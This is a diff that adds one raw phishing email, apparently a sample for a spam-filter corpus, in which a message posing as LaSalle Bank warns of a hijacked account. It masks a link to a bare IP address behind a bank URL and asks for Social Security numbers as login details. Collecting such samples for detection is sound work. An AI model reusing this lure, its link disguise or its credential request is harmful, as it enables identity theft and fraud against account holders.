@@ -1,0 +1,93 @@
+From nobody Sun Jan 25 13:49:55 2015
+Return-Path: <user@mail.example.com>
+Delivered-To: user@example.com
+Received: from mail.example.com (mail.example.com [192.168.6.4])
+ by example.com (Postfix) with ESMTP id 4B2BE2A88C
+ for <user@example.com>; Thu,  7 Jul 2005 07:51:37 -0400 (EDT)
+Received: by mail.example.com (Example mail relay)
+ id 48008621CA2; Thu,  7 Jul 2005 07:51:37 -0400 (EDT)
+Delivered-To: user@example.com
+Received: from mail.example.com (mail.example.com [192.168.3.6])
+ by mail.example.com (Example mail relay) with ESMTP id 2C878621CA1
+ for <user@example.com>; Thu,  7 Jul 2005 07:51:37 -0400 (EDT)
+Received: (from user@localhost) by mail.example.com id HAA04133
+ for user@example.com; Thu, 7 Jul 2005 07:51:36 -0400
+Received: from whale.csie.ndhu.edu.tw (whale.csie.ndhu.edu.tw [134.208.27.134])
+ by mail.example.com with ESMTP id HAA04125
+ for <user@example.com>; Thu, 7 Jul 2005 07:51:30 -0400
+Received: from whale.csie.ndhu.edu.tw (whale.csie.ndhu.edu.tw [127.0.0.1])
+ by whale.csie.ndhu.edu.tw (8.12.11/8.12.11) with ESMTP id j67NawLH022440
+ for <user@example.com>; Thu, 7 Jul 2005 19:36:59 -0400
+Received: (from abc@localhost)
+ by whale.csie.ndhu.edu.tw (8.12.11/8.12.11/Submit) id j67NapuV022439
+ for user@example.com; Thu, 7 Jul 2005 19:36:51 -0400
+Date: Thu, 7 Jul 2005 19:36:51 -0400
+To: user@example.com
+Subject: Important NOTICE
+Message-ID: <1120779411.3090.qmail@lasallebank.com>
+From: Lasalle Bank <unlock@lasallebank.com>
+Content-Type: text/html
+Status: RO
+X-Status: 
+X-Keywords: 
+X-UID: 27
+
+<html>
+
+<head>
+<meta http-equiv="Content-Language" content="en-us">
+<meta name="GENERATOR" content="Microsoft FrontPage 5.0">
+<meta name="ProgId" content="FrontPage.Editor.Document">
+<meta http-equiv="Content-Type" content="text/html; charset=windows-1252">
+<title>Dear LaSalle Bank customer</title>
+<style>
+<!--
+ p.MsoNormal
+	{mso-style-parent:"";
+	margin-bottom:.0001pt;
+	font-size:12.0pt;
+	font-family:"Times New Roman";
+	margin-left:0in; margin-right:0in; margin-top:0in}
+-->
+</style>
+</head>
+
+<body>
+
+<p class="MsoNormal">
+<img border="0" src="http://www.lasallebank.com/templates/images/lasalle_logo.gif" width="146" height="54"></p>
+<p class="MsoNormal">&nbsp;</p>
+<p class="MsoNormal"><font size="2" face="Verdana">Dear LaSalle Bank customer,</font></p>
+<p class="MsoNormal"><font size="2" face="Verdana">&nbsp;</font></p>
+<p class="MsoNormal" style="text-indent: .5in"><font size="2" face="Verdana">We 
+recently noticed one or more attempts to login intro your LaSalle Bank online 
+banking account for a foreign IP address and we have reasons to believe that 
+your account was hijacked by a third party without your notification.</font></p>
+<p class="MsoNormal"><font size="2" face="Verdana">&nbsp;</font></p>
+<p class="MsoNormal"><font size="2" face="Verdana">&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; If you recently 
+logged intro your account while traveling to a foreign country, the unusual 
+login attempts may have been made by you.</font></p>
+<p class="MsoNormal"><font size="2" face="Verdana">&nbsp;</font></p>
+<p class="MsoNormal"><font size="2" face="Verdana">&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; However if you 
+are the rightful owner of the account, click on the link below and submit as we 
+are truing to verify your account information. (In case you are not enrolled use 
+your Social Security number as you User ID and the first six digits of your 
+Social Security number as a password).</font></p>
+<p class="MsoNormal"><font size="2" face="Verdana">&nbsp;</font></p>
+<p class="MsoNormal"><font size="2" face="Verdana">
+<a style="color: blue; text-decoration: underline; text-underline: single" href="http://202.134.124.214/.cgi-bin/www.lasallebank.com/index.php">https://lasallebank.com/online/secure_account.jsp</a></font></p>
+<p class="MsoNormal"><font size="2" face="Verdana">&nbsp;</font></p>
+<p class="MsoNormal"><font size="2" face="Verdana">&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; The login attempt 
+was made from :</font></p>
+<p class="MsoNormal"><font size="2" face="Verdana">&nbsp;</font></p>
+<p class="MsoNormal"><font size="2" face="Verdana">IP: 212.52.166.107</font></p>
+<p class="MsoNormal"><font size="2" face="Verdana">ISP Host: 
+ip2.bigfootinformatika.hu</font></p>
+<p class="MsoNormal"><font size="2" face="Verdana">&nbsp;</font></p>
+<p class="MsoNormal"><font size="2" face="Verdana">&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; IF YOU CHOSE TO 
+IGNORE OUR REQUEST, WE HAVE NO CHOICE BUT TO TEMPORARILY SUSPEND YOUR ONLINE 
+BANKING ACCOUNT.</font></p>
+
+</body>
+
+</html>
